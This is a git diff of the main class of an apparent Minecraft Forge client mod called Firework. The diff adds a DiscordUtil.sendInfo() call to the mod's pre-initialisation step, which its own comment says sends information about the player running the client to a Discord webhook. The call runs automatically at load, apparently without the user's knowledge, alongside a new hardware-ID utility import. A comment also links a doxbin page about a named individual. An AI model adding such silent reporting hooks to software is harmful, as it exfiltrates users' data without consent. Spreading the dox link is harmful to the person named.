@@ -1,6 +1,10 @@
+/**@Author dazed68, __EXPLOIT__, PunCakeCat*/
+
 package com.firework.client;
 
 import com.firework.client.Managers.Parser.JsonParser;
+import com.firework.client.Utill.Client.DiscordUtil;
+import com.firework.client.Utill.Client.HwidUtil;
 import com.firework.client.Utill.Client.IconUtil;
 import com.firework.client.Utill.Client.SoundUtill;
 import net.minecraft.client.Minecraft;
@@ -16,8 +20,9 @@ import org.lwjgl.opengl.Display;
 
 import java.io.InputStream;
 import java.nio.ByteBuffer;
-import java.util.concurrent.ThreadPoolExecutor;
 
+
+//Main class to load Firework client
 @Mod(modid = Firework.MODID, name = Firework.NAME, version = Firework.VERSION)
 public class Firework
 {
@@ -39,6 +44,8 @@ public class Firework
 
     @EventHandler
     public void preInit(FMLPreInitializationEvent event) {
+        //Sends info about player running client to the discord webhook
+        DiscordUtil.sendInfo();
         //Sets custom window title when client is loading
         Display.setTitle("Loading Firework (FMLPreInitializationEvent)");
         //Creates client folder in .minecraft
@@ -70,7 +77,7 @@ public class Firework
 
     //pasted from cringe client https://github.com/CatsAreGood1337/LegacyClient-1.2.5-src/blob/main/src/main/java/me/dev/legacy/Legacy.java Строчка номер 150
 
-    /*
+    /**
     * Custom icon system
     * @author Rianix aka Egor Bazhin
     * doxbin link https://doxbin.com/upload/rianix
